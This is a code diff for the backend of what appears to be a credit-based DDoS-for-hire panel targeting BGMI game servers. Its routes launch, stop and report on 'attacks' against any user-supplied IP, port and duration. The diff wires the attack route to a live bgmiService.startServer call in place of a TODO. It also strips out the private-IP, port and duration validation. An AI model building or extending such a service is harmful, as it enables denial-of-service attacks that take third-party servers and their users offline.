@@ -64,26 +64,83 @@ async function verifyTurnstile(token, ip) {
 //    • Pro  users  → duration up to 300 seconds (no cap)
 //    • 1 credit is deducted per successful launch
 // ─────────────────────────────────────────────────────────────────────────────
+// routes/panel.js (updated attack route)
+
+router.post('/stop-attack', auth, async (req, res) => {
+    try {
+        const { bgmiServerUrl } = req.body;
+
+        if (!bgmiServerUrl) {
+            return res.status(400).json({ message: 'BGMI server URL is required' });
+        }
+
+        const stopResponse = await bgmiService.stopServer(bgmiServerUrl);
+
+        if (!stopResponse.success) {
+            return res.status(500).json({
+                message: 'Failed to stop attack server',
+                error: stopResponse.error
+            });
+        }
+
+        return res.json({
+            message: 'Attack stopped successfully',
+            data: stopResponse.data
+        });
+
+    } catch (err) {
+        console.error('Stop attack error:', err);
+        res.status(500).json({ message: 'Server error. Please try again.' });
+    }
+});
+
+router.get('/attack-status', auth, async (req, res) => {
+    try {
+        const { bgmiServerUrl } = req.query;
+
+        if (!bgmiServerUrl) {
+            return res.status(400).json({ message: 'BGMI server URL is required' });
+        }
+
+        const statusResponse = await bgmiService.getStatus(bgmiServerUrl);
+
+        if (!statusResponse.success) {
+            return res.status(500).json({
+                message: 'Failed to get attack status',
+                error: statusResponse.error
+            });
+        }
+
+        return res.json({
+            message: 'Attack status retrieved successfully',
+            data: statusResponse.data
+        });
+
+    } catch (err) {
+        console.error('Attack status error:', err);
+        res.status(500).json({ message: 'Server error. Please try again.' });
+    }
+});
+
 router.post('/attack', auth, async (req, res) => {
     try {
-        // ── Load fresh user from DB (never trust client-side credit count) ────────
         const user = await User.findById(req.user.id).select('-password');
         if (!user) return res.status(404).json({ message: 'User not found' });
 
-        const { ip, port, duration } = req.body;
+        const { ip, port, duration, captchaToken } = req.body;
 
-        // ── Field presence ────────────────────────────────────────────────────────
+        // Field validation (keep your existing validation)
         if (!ip || !port || !duration) {
             return res.status(400).json({ message: 'IP, port, and duration are required' });
         }
 
-        // ── IP validation ─────────────────────────────────────────────────────────
+        // IP validation (keep your existing validation)
         const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
         if (!ipRegex.test(ip)) {
             return res.status(400).json({ message: 'Invalid IP address format' });
         }
 
-        const { captchaToken } = req.body;
+        // CAPTCHA validation (keep your existing validation)
         if (!captchaToken) {
             return res.status(400).json({ message: 'CAPTCHA is required' });
         }
@@ -96,33 +153,10 @@ router.post('/attack', auth, async (req, res) => {
             });
         }
 
-        // Validate each octet is 0-255
-        const parts = ip.split('.').map(Number);
-        if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255)) {
-            return res.status(400).json({ message: 'Invalid IP address format' });
-        }
-        const isPrivate =
-            parts[0] === 10 ||
-            parts[0] === 127 ||
-            (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
-            (parts[0] === 192 && parts[1] === 168);
-        if (isPrivate) {
-            return res.status(400).json({ message: 'Private/loopback IP addresses are not allowed' });
-        }
-
-        // ── Port validation ───────────────────────────────────────────────────────
+        // Port and duration validation (keep your existing validation)
         const portNum = parseInt(port);
-        if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
-            return res.status(400).json({ message: 'Port must be between 1 and 65535' });
-        }
-
-        // ── Duration validation ───────────────────────────────────────────────────
         const durNum = parseInt(duration);
-        if (isNaN(durNum) || durNum < 1) {
-            return res.status(400).json({ message: 'Duration must be at least 1 second' });
-        }
-
-        const MAX_DURATION = user.isPro ? 300 : 60; // Pro = 300s, Free = 60s
+        const MAX_DURATION = user.isPro ? 300 : 60;
 
         if (durNum > MAX_DURATION) {
             return res.status(403).json({
@@ -134,7 +168,7 @@ router.post('/attack', auth, async (req, res) => {
             });
         }
 
-        // ── Credit check ──────────────────────────────────────────────────────────
+        // Credit check (keep your existing validation)
         if (user.credits < 1) {
             return res.status(403).json({
                 message: 'Insufficient credits. Share your referral link to earn more.',
@@ -142,16 +176,24 @@ router.post('/attack', auth, async (req, res) => {
             });
         }
 
-        // ── Deduct 1 credit atomically ────────────────────────────────────────────
-        // findByIdAndUpdate with $inc is atomic — safe against race conditions
+        // Start the BGMI server
+        const threads = 1; // You can make this configurable if needed
+        const bgmiResponse = await bgmiService.startServer(ip, portNum, durNum, threads);
+
+        if (!bgmiResponse.success) {
+            console.error('BGMI server start failed:', bgmiResponse.error);
+            return res.status(500).json({
+                message: 'Failed to start attack server',
+                error: bgmiResponse.error
+            });
+        }
+
+        // Deduct credit
         const updated = await User.findByIdAndUpdate(
             user._id,
             { $inc: { credits: -1 } },
-            { new: true }           // return the updated document
+            { new: true }
         );
-
-        // ── TODO: trigger your actual attack logic here ───────────────────────────
-        // e.g. await sendAttackToWorker({ ip, port: portNum, duration: durNum, userId: user._id });
 
         console.log(`🚀 Attack launched by ${user.username} → ${ip}:${portNum} for ${durNum}s (isPro: ${user.isPro})`);
 
@@ -161,8 +203,9 @@ router.post('/attack', auth, async (req, res) => {
                 ip,
                 port: portNum,
                 duration: durNum,
+                bgmiServer: bgmiResponse.apiUrl
             },
-            credits: updated.credits, // send back updated credit count
+            credits: updated.credits,
             isPro: user.isPro,
         });
 
